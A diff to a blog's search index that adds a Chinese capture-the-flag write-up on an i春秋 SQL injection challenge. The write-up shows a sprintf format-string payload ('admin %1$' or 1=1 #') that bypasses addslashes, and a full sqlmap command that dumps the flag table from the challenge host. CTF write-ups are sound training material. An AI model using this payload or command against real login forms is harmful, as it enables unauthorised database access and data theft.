@@ -3,6 +3,25 @@
   
     
     <entry>
+      <title>i春秋-WEB-SQLi</title>
+      <link href="/2018/09/10/ichunqiu-web-SQLi/"/>
+      <url>/2018/09/10/ichunqiu-web-SQLi/</url>
+      <content type="html"><![CDATA[<p>一道注入题，登录页面。</p><p>试了常见的万能密码，无效，不存在弱口令。</p><p>使用BP，看下过滤了哪些字符。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/bp-1.png" alt="BP-1"></p><p>发现参数含有<code>%</code>时，报错。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-1.png" alt="SQLi-1"></p><p>提示 <code>Warning: sprintf(): Too few arguments in /var/www/html/index.php on line 18</code>，根据提示，判定可能存在<code>sprintf格式化字符串漏洞</code>。</p><p>看下<code>sprintf</code>函数的描述。</p><p><img src="/2018/09/10/ichunqiu-web-SQLi/info-1.png" alt="Info-1"></p><p>可以构造payload:<code>admin %1$&#39; or 1=1 #</code>，顶掉占位符，注入sql语句。此处，提示<code>password error!</code></p><p>此处不回显内容，但是有错误提示，只能盲注。</p><p>可以直接用<code>sqlmap</code>跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://b968f913d88e4ce5b916d5f6a2badf2e4568f7626bc84863.game.ichunqiu.com/&quot; --data &quot;username=admin%1$&apos; * #&amp;password=12345&quot; --no-cast -p username --level 3 -T B -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img src="/2018/09/10/ichunqiu-web-SQLi/sqli-2.png" alt="SQLi-2"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.colabug.com/4099484.html" target="_blank" rel="noopener">php中利用格式化字符串漏洞绕过addslashes注入</a></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> i春秋 </tag>
+            
+            <tag> WEB </tag>
+            
+            <tag> SQLi </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>日常心路-180909</title>
       <link href="/2018/09/09/daily-life-20180909/"/>
       <url>/2018/09/09/daily-life-20180909/</url>
